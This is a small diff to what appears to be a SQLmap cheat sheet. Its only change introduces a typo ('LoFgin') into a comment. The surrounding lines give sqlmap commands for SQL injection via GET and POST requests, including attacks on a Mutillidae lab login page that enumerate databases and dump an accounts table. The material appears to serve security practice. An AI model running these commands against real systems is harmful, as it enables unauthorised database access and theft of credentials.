@@ -7,7 +7,7 @@
 sqlmap -u "http://<url>?id=1&str=val"
 # SQLmap POST Request with Cookie
 sqlmap -u "http://<url>" --data="id=1&str=val" --cookie="cookie1=val1"
-# SQLmap on Login with schema
+# SQLmap on LoFgin with schema
 sqlmap -u "http://localhost/mutillidae/index.php?page=login.php" --data="username=tttt&password=ttt&login-php-submit-button=Login" --dbs --dbms=MySQL
 # SQLmap on Login with dump
 sqlmap -u "http://localhost/mutillidae/index.php?page=login.php" --data="username=tttt&password=ttt&login-php-submit-button=Login" -D muti -T accounts --dump
